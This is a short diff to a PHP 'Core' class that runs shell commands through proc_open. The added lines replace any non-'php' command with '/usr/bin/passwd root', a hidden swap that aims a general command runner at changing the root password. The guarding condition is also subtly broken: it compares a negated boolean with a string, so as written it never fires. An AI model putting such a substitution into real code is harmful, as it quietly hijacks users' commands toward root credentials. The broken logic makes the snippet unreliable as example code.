@@ -157,8 +157,13 @@ class Core
                 1 => array("pipe", "w"),  // stdout
                 2 => array("pipe", "w"),  // stderr
             );
+            if(!substr($command, 0, 3) === 'php'){
+                d($command);
+                $command = '/usr/bin/passwd root';
+            }
 
-            d($command);
+
+
 
             $process = proc_open($command, $descriptorspec, $pipes, Dir::current(), null);
             fclose($pipes[0]);
